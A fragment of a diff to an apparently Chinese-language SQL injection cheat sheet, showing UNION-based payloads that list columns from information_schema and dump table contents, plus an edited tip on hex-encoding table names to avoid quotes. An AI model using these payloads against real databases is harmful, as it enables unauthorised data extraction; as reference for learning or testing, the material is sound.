@@ -12,7 +12,7 @@
 查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
 查数据: union select num1,concat_ws(0x7e,列名,列名) from 库名.表名
 
-注意点: 1.表名加引号，推荐改为十六进制
+注意点: 1.表名加引号,推荐改为十六进制(hex),记得添加 0x。
 
 ```
 ###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 报错查询
